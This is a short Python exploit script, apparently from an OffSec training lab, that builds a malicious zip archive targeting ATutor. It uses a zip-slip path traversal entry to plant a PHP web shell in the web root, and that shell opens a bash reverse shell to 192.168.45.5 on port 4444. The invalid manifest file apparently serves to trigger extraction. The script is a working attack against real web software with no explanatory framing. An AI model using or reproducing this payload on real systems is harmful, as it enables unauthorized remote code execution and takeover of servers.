#!/usr/bin/python3
import zipfile
from io import BytesIO

def build_zip():
	f = BytesIO()
	z = zipfile.ZipFile(f, "w", zipfile.ZIP_DEFLATED)
	#z.writestr("poc/poc1.txt", "offsec")
	
	z.writestr("../../../../../var/www/html/ATutor/mods/shell14.php5", "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/192.168.45.5/4444 0>&1'\");?>")
	z.writestr("imsmanifest.xml", "invalid tag!")
	#z.writestr("imsmanifest.xml", "<validTag></validTag>")
	z.close()

	zip = open("shell.zip", "wb")
	zip.write(f.getvalue())
	zip.close()

build_zip()
